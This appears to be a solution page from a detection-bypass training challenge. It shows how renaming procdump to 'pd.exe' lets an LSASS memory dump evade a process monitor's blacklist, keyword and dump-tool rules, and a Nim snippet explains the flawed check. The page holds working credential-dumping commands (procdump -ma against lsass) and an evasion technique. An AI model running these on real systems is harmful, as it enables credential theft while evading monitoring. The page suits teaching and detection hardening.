---
title: "Solution 14: Tool Rename for LSASS"
difficulty: medium
category: "Process Monitoring Bypass"
---

[Back to Challenge]({{ '/challenges/14-tool-rename-lsass/' | relative_url }})

## Overview

Renaming a dump tool removes it from Rule 4's indicator list, preventing the first condition from matching. Combined with PID usage, this defeats both conditions.

## Solution

```powershell
# Rename procdump
copy procdump.exe pd.exe

# Use PID for double bypass (defeats both conditions)
pd.exe -ma 672 C:\Temp\dump.dmp

# Even with "lsass" in the command line, the tool name doesn't match:
pd.exe -ma lsass.exe C:\Temp\dump.dmp
# "pd" is not in LsassDumpIndicators, so Rule 4 never checks the command line

# Also bypasses Rule 1 (process blacklist) since "pd.exe" is not blacklisted
```

## Why It Works

Rule 4 first checks if the process name or command line contains a known dump tool indicator. If this first check fails, the second check (for "lsass") is never executed.

```nim
for tool in LsassDumpIndicators:  # "procdump", "sqldumper", etc.
  if tool in nameLower or tool in cmdLower:  # "pd" not in list -> skip
    # Second condition is NEVER REACHED for renamed tools
    if "lsass" in cmdLower or "-ma" in cmdLower:
      ...
```

## Combined Bypass

Renaming defeats three rules simultaneously:
1. Rule 1: "pd.exe" not in `BlacklistedProcesses`
2. Rule 4: "pd" not in `LsassDumpIndicators`
3. Rule 2: "pd" not in `SuspiciousKeywords`
